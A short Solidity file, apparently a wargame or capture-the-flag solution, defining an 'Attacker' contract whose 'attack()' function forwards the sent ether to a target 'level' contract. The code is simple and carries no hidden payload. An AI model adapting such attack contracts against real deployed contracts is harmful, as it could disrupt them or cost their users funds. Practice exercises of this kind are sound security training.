// SPDX-License-Identifier: MIT
pragma solidity^0.8.13;

contract Attacker{
    address payable level;

    constructor(address _level) {
        level = payable(_level);
    } 

    function attack() public payable{
        level.transfer(msg.value);
    }
}